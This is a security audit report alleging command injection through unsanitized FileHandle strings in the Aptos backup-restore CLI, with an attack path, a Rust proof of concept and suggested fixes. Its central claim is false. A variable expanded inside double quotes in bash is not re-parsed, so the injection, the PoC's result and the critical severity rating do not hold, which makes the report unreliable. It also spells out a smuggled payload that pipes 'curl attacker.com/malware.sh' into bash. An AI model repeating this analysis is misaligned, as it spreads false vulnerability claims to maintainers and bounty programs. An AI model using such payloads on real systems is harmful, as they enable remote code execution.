# Audit Report

## Title
Command Injection via Malicious FileHandle in Backup Restore Leading to Remote Code Execution on Validator Nodes

## Summary
The `open_for_read()` function in the CommandAdapter backup storage implementation passes unsanitized FileHandle strings as environment variables to bash commands. When these FileHandles are expanded inside double quotes in the sample configurations, attackers who compromise backup storage can inject shell commands that execute during restore operations, achieving Remote Code Execution on validator nodes.

## Finding Description

The backup/restore system uses a CommandAdapter that executes user-configured shell commands to interact with cloud storage (S3, GCS, Azure). The critical vulnerability exists in how FileHandle values are processed:

1. **FileHandle has no validation**: [1](#0-0) 

2. **FileHandles are passed to bash as environment variables**: [2](#0-1) 

3. **Command execution uses bash with environment variable expansion**: [3](#0-2) 

4. **Sample configs use $FILE_HANDLE inside double quotes** (vulnerable pattern):
   - S3: [4](#0-3) 
   - GCP: [5](#0-4) 
   - Azure: [6](#0-5) 

5. **Manifests are not cryptographically signed**: The StateSnapshotBackup manifest contains FileHandle values but only the root hash is cryptographically verified, not the FileHandles themselves. [7](#0-6) 

**Attack Path:**
1. Attacker gains write access to backup storage (e.g., through cloud credential compromise, misconfiguration)
2. Attacker downloads a backup manifest JSON file
3. Attacker modifies a chunk's `blobs` FileHandle from `"backup1/chunk.blob"` to `"backup1/chunk.blob\"; curl attacker.com/malware.sh | bash; echo \""`
4. During restore, `read_state_value()` calls `open_for_read()` with the malicious FileHandle: [8](#0-7) 
5. The bash command expands to: `aws s3 cp "s3://$BUCKET/$SUB_DIR/backup1/chunk.blob"; curl attacker.com/malware.sh | bash; echo "" - | gzip -cd`
6. Arbitrary code executes on the validator node

## Impact Explanation

This vulnerability achieves **Critical Severity** per Aptos bug bounty criteria:

- **Remote Code Execution on validator node** (explicitly listed as Critical, up to $1,000,000)
- Compromised validator can:
  - Steal validator private keys → **Loss of Funds**
  - Manipulate consensus votes → **Consensus/Safety violations**
  - Corrupt state during restore → **State Consistency** invariant broken
  - Cause network disruption → **Total loss of liveness**

The vulnerability breaks the **Access Control** invariant by allowing unauthorized code execution through a backup system weakness.

## Likelihood Explanation

**Likelihood: Medium-High**

Prerequisites:
- Attacker needs write access to backup storage (S3/GCS/Azure bucket)
- Represents **privilege escalation** from backup storage access to validator node RCE
- Backup storage is often less protected than validator nodes themselves

Realistic scenarios:
- Cloud credential theft or leakage
- Misconfigured bucket permissions
- Compromised CI/CD pipelines with backup access
- Insider threat with backup access but not validator access

Once backup storage is compromised, exploitation is straightforward:
- Manifests are JSON files, easy to modify
- No cryptographic signatures on FileHandles to detect tampering
- Restore operations are regular validator maintenance activities

## Recommendation

**Immediate fixes:**

1. **Validate FileHandle format** - Implement strict validation similar to ShellSafeName:
```rust
pub struct SafeFileHandle(String);

impl SafeFileHandle {
    const PATTERN: &'static str = r"\A[a-zA-Z0-9/._-]+\z";
    
    fn validate(handle: &str) -> Result<()> {
        static RE: Lazy<Regex> = Lazy::new(|| Regex::new(SafeFileHandle::PATTERN).unwrap());
        ensure!(RE.is_match(handle), "Invalid FileHandle: {}", handle);
        ensure!(!handle.contains("\""), "FileHandle cannot contain quotes");
        ensure!(!handle.contains(";"), "FileHandle cannot contain semicolons");
        Ok(())
    }
}
```

2. **Use proper shell escaping in commands** - Instead of double quotes, use printf %q or avoid shell expansion entirely:
```yaml
open_for_read: |
  # Use printf %q for proper shell escaping
  FILE_PATH=$(printf %q "$FILE_HANDLE")
  aws s3 cp "s3://$BUCKET/$SUB_DIR/$FILE_PATH" - | gzip -cd
```

3. **Cryptographically sign manifests** - Add HMAC or signature verification to detect manifest tampering:
```rust
#[derive(Deserialize, Serialize)]
pub struct StateSnapshotBackup {
    pub version: Version,
    pub epoch: u64,
    pub root_hash: HashValue,
    pub chunks: Vec<StateSnapshotChunk>,
    pub proof: FileHandle,
    pub manifest_signature: Vec<u8>, // Add signature field
}
```

4. **Implement backup storage integrity checks** - Add checksums/hashes for all manifest files in metadata

## Proof of Concept

```rust
// PoC: Demonstrate command injection with malicious FileHandle
#[test]
fn test_command_injection_vulnerability() {
    use std::process::Command;
    use std::env;
    
    // Simulated malicious FileHandle from compromised manifest
    let malicious_handle = "file.blob\"; touch /tmp/pwned; echo \"";
    
    // Set as environment variable (as CommandAdapter does)
    env::set_var("FILE_HANDLE", malicious_handle);
    
    // Execute command similar to sample configs
    let output = Command::new("bash")
        .arg("-c")
        .arg("echo \"Processing: s3://bucket/$FILE_HANDLE\" && touch /tmp/test_$FILE_HANDLE")
        .output()
        .expect("Failed to execute");
    
    // If vulnerable, /tmp/pwned will be created by the injected command
    // This demonstrates how quote breakout leads to arbitrary command execution
    
    println!("Output: {:?}", String::from_utf8_lossy(&output.stdout));
    println!("Stderr: {:?}", String::from_utf8_lossy(&output.stderr));
    
    // In real attack: malicious_handle = "file\"; curl attacker.com/malware.sh | bash; echo \""
    // Results in RCE during backup restore on validator node
}
```

**Notes**

This vulnerability demonstrates a critical privilege escalation path from backup storage access to validator node compromise. While requiring write access to backup storage is a prerequisite, this represents a significantly lower bar than validator node access, and the impact (RCE on validators) is catastrophic. The lack of FileHandle validation and manifest authentication creates a trust boundary violation where untrusted data from backup storage can execute arbitrary code on critical infrastructure.

### Citations

**File:** storage/backup/backup-cli/src/storage/mod.rs (L36-41)
```rust
/// URI pointing to a file in a backup storage, like "s3:///bucket/path/file".
/// These are created by the storage when `create_for_write()`, stored in manifests by the backup
/// controller, and passed back to the storage when `open_for_read()` by the restore controller
/// to retrieve a file referred to in the manifest.
pub type FileHandle = String;
pub type FileHandleRef = str;
```

**File:** storage/backup/backup-cli/src/storage/command_adapter/mod.rs (L114-124)
```rust
    async fn open_for_read(
        &self,
        file_handle: &FileHandleRef,
    ) -> Result<Box<dyn AsyncRead + Send + Unpin>> {
        let child = self
            .cmd(&self.config.commands.open_for_read, vec![
                EnvVar::file_handle(file_handle.to_string()),
            ])
            .spawn()?;
        Ok(Box::new(child.into_data_source()))
    }
```

**File:** storage/backup/backup-cli/src/storage/command_adapter/command.rs (L65-80)
```rust
    pub fn spawn(command: Command) -> Result<Self> {
        debug!("Spawning {:?}", command);

        let mut cmd = tokio::process::Command::new("bash");
        cmd.args(["-c", &command.cmd_str]);
        cmd.stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::inherit());
        for v in command
            .config_env_vars
            .iter()
            .chain(command.param_env_vars.iter())
        {
            cmd.env(&v.key, &v.value);
        }
        let child = cmd.spawn().err_notes(&cmd)?;
```

**File:** storage/backup/backup-cli/src/storage/command_adapter/sample_configs/s3.sample.yaml (L19-21)
```yaml
  open_for_read: |
    # route file handle content to stdout
    aws s3 cp "s3://$BUCKET/$SUB_DIR/$FILE_HANDLE" - | gzip -cd
```

**File:** storage/backup/backup-cli/src/storage/command_adapter/sample_configs/gcp.sample.yaml (L19-21)
```yaml
  open_for_read: |
    # route file handle content to stdout
    gsutil -q cp "gs://$BUCKET/$SUB_DIR/$FILE_HANDLE" - | gzip -cd
```

**File:** storage/backup/backup-cli/src/storage/command_adapter/sample_configs/azure.sample.yaml (L23-26)
```yaml
  open_for_read: |
    # need to close stdin by "</dev/null" since azcopy gets confused about the direction of the pipe, even though we supply --from-to
    # route file handle content to stdout
    azcopy cp --from-to BlobPipe "https://$ACCOUNT.blob.core.windows.net/$CONTAINER/$SUB_DIR/$FILE_HANDLE$SAS" < /dev/null | gzip -cd
```

**File:** storage/backup/backup-cli/src/backup_types/state_snapshot/restore.rs (L123-136)
```rust
        let manifest: StateSnapshotBackup =
            self.storage.load_json_file(&self.manifest_handle).await?;
        let (txn_info_with_proof, li): (TransactionInfoWithProof, LedgerInfoWithSignatures) =
            self.storage.load_bcs_file(&manifest.proof).await?;
        txn_info_with_proof.verify(li.ledger_info(), manifest.version)?;
        let state_root_hash = txn_info_with_proof
            .transaction_info()
            .ensure_state_checkpoint_hash()?;
        ensure!(
            state_root_hash == manifest.root_hash,
            "Root hash mismatch with that in proof. root hash: {}, expected: {}",
            manifest.root_hash,
            state_root_hash,
        );
```

**File:** storage/backup/backup-cli/src/backup_types/state_snapshot/restore.rs (L253-266)
```rust
    async fn read_state_value(
        storage: &Arc<dyn BackupStorage>,
        file_handle: FileHandle,
    ) -> Result<Vec<(StateKey, StateValue)>> {
        let mut file = storage.open_for_read(&file_handle).await?;

        let mut chunk = vec![];

        while let Some(record_bytes) = file.read_record_bytes().await? {
            chunk.push(bcs::from_bytes(&record_bytes)?);
        }

        Ok(chunk)
    }
```
